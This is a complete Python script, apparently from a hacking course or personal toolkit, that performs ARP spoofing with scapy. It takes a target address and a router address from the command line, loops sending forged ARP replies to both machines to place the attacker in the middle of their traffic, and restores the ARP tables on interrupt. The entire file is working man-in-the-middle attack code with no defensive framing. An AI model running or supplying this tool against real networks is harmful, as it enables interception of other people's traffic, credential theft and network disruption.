#!/usr/bin/env python

import scapy.all as scapy
import optparse
import time

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="targetip", help="The address of the target")
    parser.add_option("-s", "--spoofip", dest="spoofip", help="The address of the router")

    options,arguments = parser.parse_args()

    if not options.targetip and not options.spoofip:
        parser.error("[-] Please specify a target and spoof address")
    elif not options.targetip:
        parser.error("[-] Please specify a target address")
    elif not options.spoofip:
        parser.error("[-] Please specify a spoof address")

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast_frame/arp_request
    answered_list = scapy.srp(packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
      

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #When op=2 this means that we are creating an arp response
    target_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(target_packet, verbose=False)

def restore_arp_tables(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet  = scapy.ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip,hwsrc=src_mac)
    scapy.send(packet, verbose=False, count=4)

options = get_arguments()

target_ip = options.targetip
gateway_ip = options.spoofip

packet_counter = 0
try :
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        packet_counter += 2
        print("\r[+] Packets sent: " + str(packet_counter), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Stopping ARP spoofing")
    print("[+] Restoring ARP tables on targets")
    restore_arp_tables(target_ip,gateway_ip)
    restore_arp_tables(gateway_ip, target_ip)
    print("[+] Tables restored....... Quitting")